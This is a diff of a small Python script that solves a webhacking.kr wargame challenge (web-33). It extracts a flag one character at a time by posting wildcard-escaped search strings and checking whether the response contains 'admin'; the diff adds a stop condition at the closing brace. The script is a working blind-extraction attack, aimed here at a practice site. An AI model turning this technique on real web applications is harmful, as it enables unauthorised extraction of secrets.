@@ -4,13 +4,16 @@ import string
 url = "https://webhacking.kr/challenge/web-33/"
 
 
-password = "FLAG{himiko_"
-while True:    
-    for c in "_"+string.ascii_letters+string.digits+"{"+"}"+"-"+"?":
+password = "FLAG{"
+found = False
+while not found:    
+    for c in string.ascii_letters+string.digits+"_"+"{"+"}"+"-"+"?":
         response = requests.post(url, data={"search": (password+c).replace("_", r"\_")})
-        print(c)
         if "admin" in response.text:
             password += c
-            print(password)
+            if c == '}':
+                print("final password: {}".format(password))
+                found = True
+            else:
+                print(password)
             break
-    
